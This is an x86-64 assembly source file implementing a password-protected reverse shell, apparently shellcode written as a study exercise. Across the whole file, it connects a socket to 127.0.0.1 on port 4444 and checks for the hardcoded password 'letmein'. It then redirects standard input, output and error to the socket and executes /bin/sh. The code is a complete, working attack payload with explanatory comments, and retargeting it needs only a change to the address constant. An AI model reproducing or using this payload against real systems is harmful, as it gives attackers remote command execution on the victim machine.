global _start

; >>> hex(socket.htons(4444))
; '0x5c11'
%define PORTNUMBER  0x5c11
; >>> socket.inet_pton(socket.AF_INET, '127.1')[::-1]
; '\x01\x7f'
%define IPADDR      0x017f

_start:

socket_call:
  ; #define __NR_socket 41
  ; int socket(int domain, int type, int protocol);
  ;; rax -> 41
  ;; rdi -> 2 -> AF_INET
  ;; rsi -> 1 -> SOCK_STREAM
  ;; rdx -> 0

  ; >>> import socket
  ; >>> socket.AF_INET
  ; 2
  ; >>> socket.SOCK_STREAM
  ; 1
  ; >>> socket.INADDR_ANY
  ; 0

  push 41
  pop rax         ; socket syscall

  push 2
  pop rdi         ; domain -> AF_INET

  push 1
  pop rsi         ; type -> SOCK_STREAM

  xor edx, edx    ; protocol -> 0

  syscall         ; <-- socket's return val stored in rax after syscall

  push rax
  pop rdi         ; move socket's fd into rdi

populate_sockaddr_in:
  ; assumption: rax contains result of socket syscall, use it to
  ; zero out rdx via sign extension
  cdq
  push rdx
  push rdx

  mov word [rsp + 4], IPADDR
  mov word [rsp + 2], PORTNUMBER
  mov byte [rsp], 0x2
  
  push rsp
  pop rsi

connect_call:
  ; #define __NR_connect 42
  ; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
  ;; rax -> 42
  ;; rdi -> already contains server socket fd
  ;; rsi -> already contains pointer to sockaddr_in with IP:PORT
  ;; rdx -> length of sockaddr_in (16)
  push 42
  pop rax

  push 16
  pop rdx
  syscall

read_call:
  ; #define __NR_read 0
  ; ssize_t read(int fd, void *buf, size_t count);
  ;; rax -> 0
  ;; rdi -> server already stored in rdi
  ;; rsi -> 24 bytes allocated should be good
  ;; rdx -> 24
  xor eax, eax

  sub rsp, 24
  push rsp
  pop rsi         ; user input

  push 24
  pop rdx

  syscall         ; <-- result from user stored in rsi

compare:
  ; >>> binascii.hexlify(b'letmein\n'[::-1])
  ; '0a6e69656d74656c'
  push rdi
  pop r9                        ; save server socket
  mov rax, 0x0a6e69656d74656c   ; letmein\n
  lea rdi, [rsi]

  scasq
  push r9
  pop rdi                       ; restore server socket

  ; if password isn't right, close the server socket
  jne close_call

dup2_calls:
  ; #define __NR_dup2 33
  ; int dup2(int oldfd, int newfd);
  ;; rax -> 33
  ;; rdi -> client socket
  ;; rsi -> 2 -> 1 -> 0 (3 iterations)
  push 3
  pop rcx               ; loop counter

  push 2
  pop rbx               ; fd counter
  dup2_loop:
    push 33
    pop rax
    mov esi, ebx        ; 2 -> 1 -> 0
    push rcx            ; store loop counter
    syscall
    pop rcx             ; restore loop counter
    dec rbx
    loop dup2_loop

exec_call:
  ; #define __NR_execve 59
  ; int execve(const char *filename, char *const argv[], char *const envp[]);
  ;; rax -> 59
  ;; rdi -> "/bin//sh", 0x0
  ;; rsi -> [addr of bin/sh], 0x0
  ;; rdx -> 0x0

  xor edx, edx
  push rdx          ; first NULL push

  ; push /bin//sh in reverse
  mov rbx, 0x68732f2f6e69622f
  push rbx

  ; store /bin//sh address in RDI
  push rsp
  pop rdi

  ; second NULL push
  push rdx

  ; push address of /bin//sh
  push rdi

  ; set RSI
  push rsp
  pop rsi

  ; call execve
  lea rax, [rdx + 59]
  syscall

close_call:
  ; #define __NR_close 3
  ; int close(int fd);
  ;; rax -> 3
  ;; rdi -> fd already stored in rdi
  push 3
  pop rax
  syscall

